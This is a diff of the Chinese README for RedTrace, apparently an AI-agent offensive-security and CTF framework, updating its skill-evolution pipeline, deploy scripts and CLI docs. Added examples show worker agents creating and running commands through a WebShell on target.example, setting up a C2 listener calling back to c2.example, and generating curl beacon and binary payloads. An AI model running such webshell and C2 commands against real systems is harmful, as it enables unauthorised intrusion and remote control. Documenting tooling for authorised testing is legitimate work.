@@ -40,7 +40,7 @@ flowchart TB
     RT["运行时<br/>Container Backend / Local Process"]
     W["Worker Adapter<br/>Claude Code · Codex · Pi · Mock"]
     CLI["只读辅助 CLI<br/>状态面板 · Resource · Context"]
-    EV["SkillEvolutionWorker<br/>持久提案队列 · 校验 · 版本/审计"]
+    EV["SkillEvolutionWorker<br/>候选去重 · 原生 CLI 编写 · 信任/版本/审计"]
 
     U --> API
     API --> GRAPH
@@ -53,6 +53,7 @@ flowchart TB
     RT --> W
     W --> CLI
     CLI --> API
+    W -. 紧凑 skillFeedback .-> EV
     API --> EV
     EV --> CAPS
     W -. "任务结果 / 心跳 / 事件" .-> D
@@ -108,22 +109,25 @@ Worker Adapter 将不同 Agent CLI 归一为统一接口，同时保留原生配
 
 仓库根目录的 `skills/` 是 Claude Code、Codex 和 Pi 共用的唯一 Skill 源；`mcp/` 保存共用 MCP 配置，运行时再转换为各 Agent 的原生格式；`plugins/manifest.json` 是浏览器、Burp 等外部插件的统一注册表。
 
-`CapabilityStore` 负责能力的发现、启停、版本、SHA-256 revision、历史、锁和审计。`SkillEvolutionEngine` 只接受完整的 `SKILL.md` 替换提案，并要求：
+`CapabilityStore` 负责能力的发现、启停、可信状态、复用/失败计数、SHA-256 revision、历史、锁和审计。Worker 在原任务的最终 JSON 中至多附带一份紧凑 `skillFeedback`，不编写完整 Skill，也不额外调用工具或模型。`SkillEvolutionEngine` 会：
 
-- 提供 1–8 条具体验证结果；
-- 任务确实成功，且量化节省的工具调用、无效步骤或执行时间；
-- 拒绝重复内容、单纯追加、过度增长和过期 revision；
+- 接受整个任务成功，或任务失败但独立子流程已验证的候选；
+- 要求 1–8 条具体验证结果、可复用步骤和有界证据引用，并过滤目标/凭据/临时路径；
+- 合并相同候选，只对高信号候选在后台调用本机 Claude Code、Codex 或 Pi；
+- 统一处理 `FIX`、`IMPROVE`、`CAPTURE`、`MERGE`、`RETIRE`；
+- 拒绝重复内容、单纯追加、过度增长、不完整 Skill 和过期 revision；
 - 优先匹配并更新已有 Skill，只有在容量允许且没有可复用 Skill 时才新建；
-- 对冗余 Skill 做合并/退役，并保留版本和回滚记录。
+- 将新建或大幅修改的 Skill 标记为 `provisional`，经另一独立任务验证复用后升为 `trusted`；
+- 对冗余或失效 Skill 做合并/退役，并保留来源任务、验证证据、版本和回滚记录。
 
-提案写入持久 inbox 后由 `SkillEvolutionWorker` 异步处理，不在任务执行路径中额外调用模型。
+候选写入持久 inbox 后由 `SkillEvolutionWorker` 低优先级异步处理；正在运行的 Skill 快照不刷新，演进失败也不会影响任务。`redtrace-skill propose` 仍保留为人工提交完整替换的兼容入口。
 
 ### 5. 辅助 CLI 与上下文面
 
 为避免把完整历史无边界地塞进 Prompt，项目提供三个按需工具：
 
 - `redtrace-blackboard`：状态面板只读 CLI，支持 `status`、`changes`、`node`、`path`、`context`；该入口名为历史兼容名称；
-- `redtrace-resource`：列出/读取资源，按声明动作排队执行操作，敏感值始终留在 Server 侧；
+- `redtrace-resource`：用单次快照和增量游标发现资源，创建/复用 WebShell，完整创建 C2 Listener、生成 Payload 并等待资源操作结果；除生成后的受控 Payload 内容外，持久化敏感值始终留在 Server 侧；
 - `redtrace-context`：对任务 Workspace 中的文件做有预算的摘要、类型识别、信号提取和增量快照。
 
 Context Harness 输出固定的 JSON/JSONL 工件和摘要引用，支持跨任务复用、内存/耗时统计以及大型文件的边界读取。
@@ -199,10 +203,12 @@ Context Harness 输出固定的 JSON/JSONL 工件和摘要引用，支持跨任�
 ```bash
 git clone https://github.com/0X6C7879/RedTrace.git
 cd RedTrace
-BRAVE_API_KEY="replace-me" bash deploy-local.sh
+BRAVE_API_KEY="replace-me" bash deploy.sh
 ```
 
-部署脚本会安装依赖、同步原生 CLI 配置并加密保存 Brave API Key。默认模型上下文
+统一部署脚本会自动识别 Linux/macOS，安装依赖、Claude Code/Codex/Pi、
+Playwright CLI 与 Chromium，并校验仓库内的 `playwright` Skill。Linux 默认加密
+保存 Brave API Key，macOS 本地调试默认使用明文配置。默认模型上下文
 按 1,000,000 tokens 配置，并在约 90% 时进行自动压缩；Bootstrap 和 Explore
 各有 30 分钟主阶段与 5 分钟收尾，Reason 为 5 分钟，健康检查为 60 秒。
 
@@ -225,11 +231,33 @@ REDTRACE_DISPATCH_CONFIG="$PWD/dispatch.local.yaml" uv run --project redtrace re
 uv run --project redtrace redtrace dispatch --config dispatch.local.yaml
 ```
 
-其他 Ubuntu/Kali 环境也可使用一键脚本准备 CLI、RTK、项目依赖和安全相关
-Skills；脚本会提示它不是默认的 WSL root 部署，但仍可继续：
+如果仓库根目录已有 `dispatch.yaml`，macOS 与 Linux 可以用同一个快捷脚本同时启动
+Server 和 Dispatcher；按 `Ctrl+C` 会一起停止本次启动的进程：
 
 ```bash
-bash deploy-local.sh
+./start-redtrace.sh
+```
+
+可通过 `./start-redtrace.sh --help` 查看自定义配置路径、监听地址和端口等选项。
+
+macOS 和 Linux 共用唯一的 `deploy.sh`。Linux 支持 APT、DNF/YUM、Pacman、
+Zypper 和 APK，覆盖 Debian/Ubuntu/Kali、Fedora/RHEL/Rocky/Alma、Arch、
+openSUSE 与 Alpine；脚本会通过 `install_ctf_tools.sh` 使用对应发行版的包名
+映射准备 CLI、RTK、项目依赖和安全工具。macOS 使用 Homebrew；SageMath 默认
+不安装：
+
+```bash
+bash deploy.sh
+```
+
+Linux 分支不会改写 `/etc/apt`、Shell profile、持久 PATH 或其他既有系统环境
+配置；它只使用当前软件源安装依赖，并把用户级 PATH 调整限制在本次部署进程内。
+
+也可以只安装跨发行版 CTF 工具链，或先做无写入干跑：
+
+```bash
+bash install_ctf_tools.sh all
+bash install_ctf_tools.sh --dry-run dnf
 ```
 
 ### 常用 CLI
@@ -240,12 +268,26 @@ redtrace-blackboard status
 redtrace-blackboard changes --since 42 --limit 20
 redtrace-blackboard context f003 --depth 1 --limit 30
 
-# 读取共享资源或排队资源动作
+# 一次读取当前接入面并保留游标；人工新增资源后只做决策点增量刷新
 redtrace-resource capabilities
-redtrace-resource list
-redtrace-resource tasks
+redtrace-resource snapshot \
+  --kind webshell --kind c2_listener --kind c2_session --kind c2_payload
+redtrace-resource changes --since 42
 
-# 提交一份带验证证据的 Skill 演进提案
+# Worker 可创建并立即复用 WebShell
+redtrace-resource webshell-create \
+  --name primary --target https://target.example/shell.php \
+  --command-param cmd --password-stdin
+redtrace-resource run ws_123 command --command-text id --wait
+
+# 无现有 Session 时，Worker 可创建 Listener 并生成最小兼容 Payload
+redtrace-resource listener-create \
+  --name primary-http --bind-port 8443 --callback-host c2.example
+redtrace-resource payload-kinds lis_123
+redtrace-resource payload-oneliner lis_123 curl_beacon
+redtrace-resource payload-build lis_123 --os linux --arch amd64
+
+# 人工提交完整替换（Worker 自动反馈不使用此命令）
 redtrace-skill propose \
   --name my-skill \
   --candidate skills/my-skill/SKILL.md \
